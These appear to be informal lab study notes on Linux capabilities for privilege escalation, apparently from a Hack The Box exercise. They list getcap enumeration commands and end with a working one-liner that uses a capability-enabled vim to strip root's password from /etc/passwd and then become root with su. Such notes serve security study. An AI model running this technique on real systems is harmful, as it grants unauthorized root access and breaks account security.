
### What Are Linux Capabilities?

Traditionally in Linux, only the **root user** could do powerful system tasks (like changing system files or binding to ports below 1024).

But that’s a bit too much power.

**Linux capabilities** break up that full root power into smaller pieces. Each "piece" lets a program do **just one special thing** — like:

```bash
getcap -r / 2>/dev/null


# How to See Which Programs Have Capabilities?
`find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`
```
- `cap_setuid+ep` : May allow executing as root (UID 0)
- `cap_dac_read_search+ep` : Can bypass file read permissions
- `cap_net_bind_service`: Bind to low-numbered ports (like 80)
- `cap_sys_admin`: Do admin stuff like mounting drives
- `cap_dac_override`: Bypass file permissions

go to [https://gtfobins.github.io/](https://gtfobins.github.io/) and find the exploit

___
#  #vim

suppose we have vim capabilities

```
htb-student@ubuntu:~$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic = cap_dac_override+eip
```
- **What this means**: This `vim.basic` can **ignore file permissions**.
- **So what?** You can use it to **edit protected files**, like `/etc/passwd`, **even if you're not root**!

Instead of using Vim interactively (which can be tricky), let’s do it non-interactively using this one-liner:
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
✅ What this does:
- It **replaces** `root:x:` with `root::`
- It **removes the password** for root
- It **saves** and **quits** Vim silently

just type `su` and you will have root user access